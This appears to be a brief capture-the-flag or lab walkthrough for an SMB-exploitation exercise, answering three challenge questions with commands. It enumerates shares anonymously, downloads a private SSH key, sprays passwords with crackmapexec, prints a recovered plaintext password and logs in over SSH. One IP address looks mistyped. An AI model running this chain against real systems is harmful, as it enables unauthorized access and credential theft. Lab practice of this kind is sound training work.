## What is the name of the shared folder with READ permissions?
```
sudo nmap 10.129.203.6 -sV -sC -p139,445
smbclient -N -L //110.129.203.6
smbmap -H 10.129.16.215
```

## What is the password for the username "jason"?
```
smbmap -H 10.129.16.215 -r GGJ
smbmap -H 10.129.16.215 --download "GGJ\id_rsa"
rpcclient -U'%' 10.129.16.215

crackmapexec smb 10.129.16.215 -u jason -p pws.list --local-auth
```

## Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

```
smbmap -H 10.129.16.215 -u jason -p '34c8zuNBo91!@28Bszh' --download "GGJ\\id_rsa"
chmod 600 GGJ_id_rsa
ssh -i GGJ_id_rsa jason@10.129.16.215

```